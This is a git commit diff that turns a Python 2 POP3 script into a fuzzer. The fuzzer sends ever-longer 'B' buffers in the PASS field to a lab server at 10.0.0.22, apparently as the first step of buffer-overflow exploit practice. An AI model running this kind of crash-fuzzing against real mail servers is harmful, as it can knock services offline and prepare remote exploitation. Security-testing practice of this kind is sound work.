19e329a3b08ded5eaf62097ed7db41112853b17e
Bobby Pratama <bobby.pratama.1@gmail.com>
2017-09-23 15:41:15 +0700

    fuzzing

--- bof1.py
+++ bof1.py
@@ -1,18 +1,30 @@
 #!/usr/bin/python
 import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    print "\nSending evil buffer..."
-    s.connect(('10.0.0.22',110)) # connect to IP, POP3 port
-    data = s.recv(1024) # receive banner
-    print data # print banner
+
+buffer=["B"]
+count=100
+while len(buffer) <=30:
+    buffer.append("B"*count)
+    count=count+200
+
+for string in buffer:
+    print "\nFuzzing PASS with %s bytes" % len(string)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect(('10.0.0.22',110)) 
+    data = s.recv(1024)
+    print data
+
     s.send('USER test' +'\r\n') # send username "test"
     data = s.recv(1024) # receive reply
     print data # print reply
-    s.send('PASS test\r\n') # send password "test"
+
+    s.send('PASS ' + string + '\r\n') # send password "test"
     data = s.recv(1024) # receive reply
     print data # print reply
+
+    s.send('QUIT' +'\r\n') # send username "test"
+    data = s.recv(1024) # receive reply
+    print data # print reply
+
     s.close() # close socket
     print "\nDone!"
-except:
-    print "\nException occurs!"
